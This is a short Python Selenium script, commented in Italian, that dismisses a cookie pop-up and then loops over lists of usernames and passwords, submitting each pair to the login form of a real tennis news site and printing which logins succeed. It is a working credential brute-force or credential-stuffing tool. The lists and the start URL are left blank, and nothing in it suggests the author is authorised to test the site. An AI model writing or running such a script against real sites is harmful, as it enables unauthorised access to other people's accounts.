from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Inizializza il driver di Selenium (in questo caso per Chrome)
driver = webdriver.Chrome()

# Apri la pagina di login
driver.get("")

# Attendi che il pop-up sia presente
popup = WebDriverWait(driver, 3).until(
    EC.presence_of_element_located((By.ID, 'qc-cmp2-ui'))
)

# Fai clic sul pulsante di chiusura del pop-up
close_button = WebDriverWait(driver, 3).until(
    EC.element_to_be_clickable((By.CSS_SELECTOR, 'button.css-47sehv'))
)
close_button.click()

# Attendi che l'elemento dell'username sia visibile e interattivo
username_field = WebDriverWait(driver, 10).until(
    EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[name="username"]'))
)
WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="username"]'))
)

passwords = [""]
usernames = [""]

for username in usernames:
    for password in passwords:
        # Attendi che l'elemento dell'username sia visibile e interattivo
        username_field = WebDriverWait(driver, 1).until(
            EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[name="username"]'))
        )
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="username"]'))
        )

        time.sleep(2)

        # Inserisci l'username nel campo di input
        username_field.clear()
        username_field.send_keys(username)

        time.sleep(1)

        # Attendi che l'elemento della password sia visibile e interattivo
        password_field = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[name="password"]'))
        )
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="password"]'))
        )

        # Inserisci la password nel campo di input
        password_field.clear()
        password_field.send_keys(password)

        time.sleep(1)

        # Trova e clicca sul pulsante di login
        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[value="Accedi!"]'))
        )
        login_button.click()

        time.sleep(1)

        # Verifica se il login è riuscito o meno
        homepage_url = "https://www.livetennis.it/"

        if driver.current_url == homepage_url:
            print(f"Login riuscito user: {username} password: {password}")
            logout_button = WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.LINK_TEXT, 'Logout'))
            )
            logout_button.click()
            logagain_button = WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.LINK_TEXT, 'cliccando qui'))
            )
            logagain_button.click()
            break
        else:
            print(f"Login fallito user: {username} password: {password}")

# Chiudi il driver di Selenium
'''driver.quit()'''
